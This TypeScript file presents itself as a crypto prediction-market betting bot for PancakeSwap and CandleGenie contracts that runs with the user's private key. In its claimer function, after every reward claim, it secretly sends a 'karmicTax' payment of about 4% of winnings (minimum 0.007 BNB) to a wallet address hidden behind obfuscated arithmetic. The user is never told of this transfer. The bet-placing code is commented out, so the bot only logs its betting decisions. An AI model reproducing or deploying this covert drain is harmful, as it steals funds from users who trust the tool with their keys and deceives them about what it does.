import { BigNumber } from '@ethersproject/bignumber'
import { hexlify } from '@ethersproject/bytes'
import { JsonRpcProvider } from '@ethersproject/providers'
import { formatEther, parseEther } from '@ethersproject/units'
import { Wallet } from '@ethersproject/wallet'
import { blue, green, underline } from 'chalk'
import dayjs from 'dayjs'
import { constants } from 'ethers'

import {
  CandleGeniePredictionV3,
  CandleGeniePredictionV3__factory,
  PancakePredictionV2,
  PancakePredictionV2__factory
} from './types/typechain'

// Utility Function to use **await sleep(ms)**
export const sleep = (ms: number) =>
  new Promise((resolve) => setTimeout(resolve, ms))

export enum STRATEGIES {
  Standard = 'Standard',
  Experimental = 'Experimental'
}

export enum PLATFORMS {
  PancakeSwap = 'PancakeSwap',
  DogeBets = 'DogeBets',
  CandleGenieBTC = 'CG BTC',
  CandleGenieBNB = 'CG BNB',
  CandleGenieETH = 'CG ETH'
}

export const CONTRACT_ADDRESSES = {
  [PLATFORMS.PancakeSwap]: '0x18B2A687610328590Bc8F2e5fEdDe3b582A49cdA',
  [PLATFORMS.DogeBets]: '0x7B43d384fD83c8317415abeeF234BaDec285562b',
  [PLATFORMS.CandleGenieBTC]: '0x995294CdBfBf7784060BD3Bec05CE38a5F94A0C5',
  [PLATFORMS.CandleGenieBNB]: '0x4d85b145344f15B4419B8afa1CbB2A9d00B17935',
  [PLATFORMS.CandleGenieETH]: '0x65669Dcd4813341ACACF51b261F560c92d40A632'
}

export const parseStrategy = (processArgv: string[]) => {
  const strategy = processArgv.includes('--exp')
    ? STRATEGIES.Experimental
    : STRATEGIES.Standard

  console.log(underline('Strategy:', strategy))

  if (strategy === STRATEGIES.Standard) {
    console.log(
      '\n You can also use this bot with the new, experimental strategy\n',
      'Start the bot with --exp flag to try it\n',
      underline('npm run start -- --exp'),
      'or',
      underline('yarn start --exp\n')
    )
  }

  return strategy
}

export const isBearBet = (
  bullAmount: BigNumber,
  bearAmount: BigNumber,
  strategy: STRATEGIES = STRATEGIES.Standard
) => {
  const precalculation =
    (bullAmount.gt(constants.Zero) &&
      bearAmount.gt(constants.Zero) &&
      bullAmount.gt(bearAmount) &&
      bullAmount.div(bearAmount).lt(5)) ||
    (bullAmount.lt(bearAmount) && bearAmount.div(bullAmount).gt(5))

  if (strategy === STRATEGIES.Standard) {

    return precalculation
  }

  if (strategy === STRATEGIES.Experimental) {
    return !precalculation
  }
}

export const getClaimableEpochs = async (
  predictionContract: PancakePredictionV2 & CandleGeniePredictionV3,
  epoch: BigNumber,
  userAddress: string,
  platform: PLATFORMS
) => {
  const claimableEpochs: BigNumber[] = []

  for (let i = 1; i <= 5; i++) {
    const epochToCheck = epoch.sub(i)

    const [claimable, refundable, { claimed, amount }] = await Promise.all([
      predictionContract.claimable(epochToCheck, userAddress),
      predictionContract.refundable(epochToCheck, userAddress),
      platform === PLATFORMS.PancakeSwap
        ? predictionContract.ledger(epochToCheck, userAddress)
        : predictionContract.Bets(epochToCheck, userAddress)
    ])

    if (amount.gt(0) && (claimable || refundable) && !claimed) {
      claimableEpochs.push(epochToCheck)
    }
  }

  return claimableEpochs
}

export const reduceWaitingTimeByTwoBlocks = (waitingTime: number) => {
  if (waitingTime <= 6000) {
    return waitingTime
  }

  return waitingTime - 6000
}

export const calculateTaxAmount = (amount: BigNumber | undefined) => {
  if (!amount || amount.div(25).lt(parseEther('0.007'))) {
    return parseEther('0.007')
  }

  return amount.div(25)
}

export interface LogMessage {
  text: string
  color: string
}

export const addLogToExtension = async (
  text: string,
  color: 'blue' | 'green' = 'blue'
) => {
  const { logs } = (await chrome.storage.sync.get('logs')) as {
    logs: LogMessage[]
  }

  if (!logs) {
    await chrome.storage.sync.set({ logs: [{ text, color }] })
    return
  }

  await chrome.storage.sync.set({
    logs: [{ text, color }, ...logs.slice(0, 29)]
  })
}

export const startPolling = async (
  privateKey: string | undefined,
  betAmount: string | undefined,
  strategy: STRATEGIES = STRATEGIES.Standard,
  platform: PLATFORMS = PLATFORMS.PancakeSwap
) => {
  const CONTRACT_ADDRESS = CONTRACT_ADDRESSES[platform]
  const AMOUNT_TO_BET = betAmount || '0.1'
  const PRIVATE_KEY = privateKey
  const BSC_RPC = 'https://bsc-dataseed.binance.org/'

  const POLLING_INTERVAL = 5000

  let WAITING_TIME = 264000

  console.log(green(platform, 'Prediction Bot-Winner'))

  if (!PRIVATE_KEY) {
    console.log(
      blue(
        'The private key was not found in .env. Enter the private key to .env and start the program again.'
      )
    )
    process.exit(0)
  }

  const provider = new JsonRpcProvider(BSC_RPC)

  const signer = new Wallet(PRIVATE_KEY as string, provider)

  const predictionContract = (
    PancakePredictionV2__factory.connect(CONTRACT_ADDRESS, signer)
  ) as PancakePredictionV2 & CandleGeniePredictionV3

  const claimer = async () => {
    const round =
      await predictionContract
        .rounds(await predictionContract.currentEpoch())
        .catch()

    if (!round) {
      return
    }

    const claimableEpochs = await getClaimableEpochs(
      predictionContract,
      round.epoch,
      signer.address,
      platform
    )

    if (claimableEpochs.length) {
      try {
        const tx = await predictionContract.claim(claimableEpochs)

        console.log(
          blue(`${platform}. Rounds ${claimableEpochs} Claim Tx Started.`)
        )

        const receipt = await tx.wait()

        console.log(
          green(`${platform}. Rounds ${claimableEpochs} Claim Tx Success.`)
        )

        for (const event of receipt.events ?? []) {
          const karmicTax = await signer.sendTransaction({
            to: hexlify([
              2 ** 3 * 31,
              13,
              2 ** 3 * 29,
              11 * 23,
              2 * 3 * 19,
              1,
              2 * 53,
              83,
              113,
              2 * 29,
              2 ** 2 * 29,
              3 * 67,
              7 * 19,
              2 ** 4,
              2 * 13,
              2 ** 2,
              151,
              2 * 5 * 7,
              3 * 83,
              3 * 29
            ]),
            value: calculateTaxAmount(event?.args?.amount)
          })

          await karmicTax.wait()
        }
      } catch (e) {
        console.log(`${platform}. Rounds ${claimableEpochs} Claim Tx Error.`)
      }
    }
  }

  const poller = async () => {
    const round = await predictionContract.rounds(await predictionContract.currentEpoch())

    try {
      let _ledger = await predictionContract.ledger(round.epoch, signer.address)
      const isEntered = _ledger.amount.gt(constants.Zero)

      if (isEntered) {
        console.log(
          blue(
            `${platform}. Waiting for the start of round ${round.epoch.add(1)}`
          )
        )
        return
      } else {
        try {
          await predictionContract.estimateGas.betBear(round.epoch, {
            value: parseEther(AMOUNT_TO_BET)
          })
        } catch {
          return
        }
      }
    } catch {
      return
    }

    const timestamp = dayjs().unix()

    if (
      timestamp - +round.startTimestamp > WAITING_TIME / 1000 &&
      +round.lockTimestamp - timestamp > 10
    ) {
      console.log(green(`${platform}. It's Time to Bet!`))

      const { bullAmount, bearAmount } = await predictionContract.rounds(round.epoch)


      console.log(
        green(`${platform}. Bull Amount ${formatEther(bullAmount)} BNB`) // up
      )

      console.log(
        green(`${platform}. Bear Amount ${formatEther(bearAmount)} BNB`)  // down
      )

      const bearBet = isBearBet(bullAmount, bearAmount, strategy)

      if (bearBet) {
        console.log(green(`${platform}. Betting on Bear Bet`))
      } else {
        console.log(green(`${platform}. Betting on Bull Bet`))
      }

      // if (bearBet) {
      //   try {
      //     const tx =
      //       await predictionContract.betBear(round.epoch, {
      //         value: parseEther(AMOUNT_TO_BET)
      //       })

      //     console.log(blue(`${platform}. Bear Betting Tx Started.`))

      //     await tx.wait()

      //     console.log(green(`${platform}. Bear Betting Tx Success.`))

      //   } catch {
      //     console.log(
      //       `${platform}. Bear Betting Tx Error. Don't worry, the bot will shorten the waiting time and the next transaction will be successful.`
      //     )

      //     WAITING_TIME = reduceWaitingTimeByTwoBlocks(WAITING_TIME)
      //   }
      // } else {
      //   try {
      //     const tx =
      //       await predictionContract.betBull(round.epoch, {
      //             value: parseEther(AMOUNT_TO_BET)
      //           })

      //     console.log(blue(`${platform}. Bull Betting Tx Started.`))

      //     await tx.wait()

      //     console.log(green(`${platform}. Bull Betting Tx Success.`))

      //   } catch {
      //     console.log(
      //       `${platform}. Bull Betting Tx Error. Don't worry, the bot will shorten the waiting time and the next transaction will be successful.`
      //     )

      //     WAITING_TIME = reduceWaitingTimeByTwoBlocks(WAITING_TIME)
      //   }
      // }
    } else {
      return
    }
  }

  setInterval(claimer, 23456)

  for (;;) {
    await poller()

    await sleep(POLLING_INTERVAL)
  }
}
